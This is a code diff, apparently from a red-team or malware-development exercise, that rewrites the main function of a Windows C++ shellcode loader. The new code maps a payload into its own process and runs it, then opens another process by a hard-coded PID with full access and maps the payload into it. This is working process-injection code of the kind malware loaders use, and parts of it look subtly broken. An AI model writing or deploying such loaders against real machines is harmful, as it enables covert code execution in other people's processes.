@@ -118,29 +118,36 @@ int main() {
         0xC0, 0xC3
     };
 
-    PVOID pMappedAddress = NULL;
-    if (LocalMapInject(payload, sizeof(payload), &pMappedAddress)) {
-        std::cout << "[+] Payload Mapped Successfully at Address: " << pMappedAddress << '\n';
-        
-        // Execute the payload
-        ((void(*)())pMappedAddress)();
-    } else {
-        std::cerr << "[!] Payload Mapping Failed\n";
-    }
+    PVOID pRemoteMappedAddress = NULL, pLocalAddress;
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* Target PID */ 9436);
+	cout << hProcess;
+	if (LocalMapInject(payload, sizeof(payload), pLocalAddress)) {
+		std::cout << "[+] Payload Locally Mapped Successfully at Address: " << pLocalAddress << '\n';
+		((void(*)())pLocalAddress)();
+		/*HANDLE hThread = CreateThread(
+			nullptr,
+			0,
+			reinterpret_cast<LPTHREAD_START_ROUTINE>(pLocalAddress),
+			nullptr,
+			0,
+			nullptr
+		);
+		WaitForSingleObject(hThread, INFINITE);*/
+	}
+	else {
+		std::cerr << "[!] Local Payload Mapping Failed\n";
+	}
+	
+	if (RemoteMapInject(hProcess, payload, sizeof(payload), pRemoteMappedAddress)) {
+		std::cout << "[+] Payload Remotely Mapped Successfully at Address: " << pRemoteMappedAddress << '\n';
+	}
+	else {
+		std::cerr << "[!] Remote Payload Mapping Failed\n";
+	}
 
-    UnmapViewOfFile(pMappedAddress);
+	UnmapViewOfFile(pRemoteMappedAddress);
+	CloseHandle(hProcess);
 
-    PVOID pRemoteMappedAddress = NULL;
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, /* Target PID */ 1234);
-    if (RemoteMapInject(hProcess, payload, sizeof(payload), &pRemoteMappedAddress)) {
-        std::cout << "[+] Payload Remotely Mapped Successfully at Address: " << pRemoteMappedAddress << '\n';
-    } else {
-        std::cerr << "[!] Remote Payload Mapping Failed\n";
-    }
-
-    UnmapViewOfFile(pRemoteMappedAddress);
-    CloseHandle(hProcess);
-
-    return 0;
+	return 0;
 }
 ```
